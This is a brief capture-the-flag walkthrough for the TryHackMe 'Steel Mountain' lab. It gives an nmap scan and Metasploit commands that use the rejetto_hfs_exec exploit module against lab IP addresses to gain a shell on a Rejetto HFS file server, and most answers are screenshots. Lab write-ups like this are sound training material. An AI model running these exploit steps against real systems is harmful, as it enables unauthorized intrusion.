# Steel Mountain

**Room Link:** [https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)

## **Walkthrough**

**Introduction**

**Who is the employee of the month?**

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### **Initial Access**

**Scan the machine with nmap. What is the other port running a web server on?**

`nmap -A` 10.10.248.189

![](<../../.gitbook/assets/image (7).png>)

**Take a look at the other web server. What file server is running?**

Google this

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

**What is the CVE number to exploit this file server?**

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Use Metasploit to get an initial shell. What is the user flag?**

`msfconsole`&#x20;

`use exploit/windows/http/rejetto_hfs_exec`&#x20;

`set LHOST 10.10.62.157`&#x20;

`set RHOSTS 10.10.181.159`&#x20;

`set RPORT 8080\`

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

``
